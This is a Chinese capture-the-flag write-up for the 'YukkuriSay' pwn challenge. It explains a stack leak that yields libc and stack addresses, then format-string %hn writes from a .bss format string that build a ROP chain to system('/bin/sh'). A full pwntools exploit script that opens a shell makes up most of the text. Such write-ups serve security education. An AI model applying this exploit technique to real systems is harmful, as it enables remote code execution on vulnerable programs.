# YukkuriSay

## 题目简述

程序先把用户内容读入栈缓冲区并用 `%s` 输出，之后又把另一段输入直接作为 `printf` 的格式字符串。格式串本身位于 `.bss`，无法像常规模板那样把目标地址直接拼在格式串末尾；但前一阶段可以向栈上布置参数，因此可以把“栈上地址表”和“.bss 中的格式串”分开构造。

## 解题过程

第一阶段的 `read` 不会自动补 `\0`。输入恰好覆盖到缓冲区末尾后，后续 `%s` 会继续打印栈上的残留指针。官方环境使用 glibc 2.31，可先泄露 `_IO_2_1_stderr_`，再计算 libc 基址；重复一次可以取得栈地址。

有了栈地址后，在栈上放置一组半字写目标：依次指向 ROP 区的 `rop_addr+0`、`rop_addr+2`、`rop_addr+4` 等位置。随后由 `.bss` 中的格式串通过 `%hn` 写入：

```text
rop_addr + 0x00: pop rdi ; ret
rop_addr + 0x08: "/bin/sh" 地址
rop_addr + 0x10: ret
rop_addr + 0x18: system 地址
```

完整利用脚本如下。使用 `REMOTE HOST=<地址> PORT=<端口>` 切换远程模式；偏移和 gadget 地址对应官方附件及其 glibc，若替换二进制必须重新确认：

```python
from pwn import *

context.arch = "amd64"


def split_halfwords(target: int) -> list[int]:
    """返回按低地址到高地址依次写入时所需的累计打印增量。"""
    widths = []
    printed = 0
    for _ in range(4):
        halfword = target & 0xFFFF
        width = (halfword - printed) & 0xFFFF
        widths.append(width)
        printed = (printed + width) & 0xFFFF
        target >>= 16
    return widths


elf = ELF("./vuln", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)

if args.REMOTE:
    host = args.HOST or "challenge.example"
    port = int(args.PORT or 31337)
    io = remote(host, port)
else:
    io = process(elf.path)

pop_rdi = 0x401783
ret = 0x40101A

# 未终止字符串越界打印，先泄露 libc 指针。
io.sendafter(b"say?", b"a" * 0x98)
stderr_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = stderr_addr - libc.sym["_IO_2_1_stderr_"]
system_addr = libc.sym["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

# 再泄露一个栈地址，确定将要写入的 ROP 区。
io.sendlineafter(b"(Y/n)", b"Y")
io.send(b"a" * 0x100)
stack_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
rop_addr = stack_addr - 8

# 把每个 %hn 所需的目标地址布置成栈参数 8 至 21。
io.sendlineafter(b"(Y/n)", b"Y")
targets = []
targets += [rop_addr + offset for offset in (0, 2, 4)]
targets += [rop_addr + 0x10 + offset for offset in (0, 2, 4)]
targets += [rop_addr + 0x08 + offset for offset in (0, 2, 4, 6)]
targets += [rop_addr + 0x18 + offset for offset in (0, 2, 4, 6)]
io.send(b"".join(p64(address) for address in targets))

io.sendlineafter(b"(Y/n)", b"N")

payload = b""
argument = 8
for value, count in (
    (pop_rdi, 3),
    (ret, 3),
    (bin_sh, 4),
    (system_addr, 4),
):
    for width in split_halfwords(value)[:count]:
        # %lx 保持 64 位参数消费宽度；使用 %c 会破坏后续参数布局。
        payload += f"%{width}lx%{argument}$hn".encode()
        argument += 1

io.send(payload + b"\x00")
io.interactive()
```

格式串中负责增加输出计数的转换也会消费可变参数。官方脚本使用 `%lx`，使参数按 64 位读取；若机械替换成 `%c`，栈参数消费方式变化，后面的 `%8$hn` 等写目标可能只得到残缺地址。

原 PDF 没有记录运行后的具体 flag 文本，但利用链和脚本完整，可在原始 ELF 与配套 `libc-2.31.so` 下复现 shell。

## 方法总结

本题展示了格式串不在栈上时的处理方法：先利用另一输入把目标地址表放到栈中，再让格式串按参数序号引用。利用过程必须分别证明 libc 泄露、栈泄露、参数位置和半字写入；`%hn` 的累计输出计数以及转换说明符的参数宽度都会直接影响稳定性。
